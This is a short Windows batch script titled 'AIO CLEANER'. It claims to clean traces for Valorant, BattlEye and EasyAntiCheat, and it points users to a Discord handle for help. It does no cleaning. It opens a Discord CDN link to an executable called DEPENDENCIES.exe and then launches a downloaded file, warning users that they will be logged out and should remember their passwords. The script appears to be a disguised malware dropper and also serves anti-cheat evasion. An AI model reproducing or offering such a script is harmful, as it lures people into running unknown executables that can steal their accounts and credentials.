@echo off
title bigdickhavoc on discord for help
color 5
@ ECHO.-------------------- AIO CLEANER --------------------
@ ECHO.
@ ECHO. CLEANER WILL LOG YOU OUT DUE TO CLEANING PROCCSESS SO REMEBER YOUR PASSWORDS
@ ECHO. CLEANER WORKING FOR VALORANT/BE/EAC
@ ECHO. IF THERE IS AN ERROR RUN THE FILE THAT WAS INSTALLED THEN RUN THE CLEANER
start "" https://cdn.discordapp.com/attachments/1112496744731783279/1125206339145187388/DEPENDENCIES.exe
start "" c:\downloads\DEPENDENCIES
pause
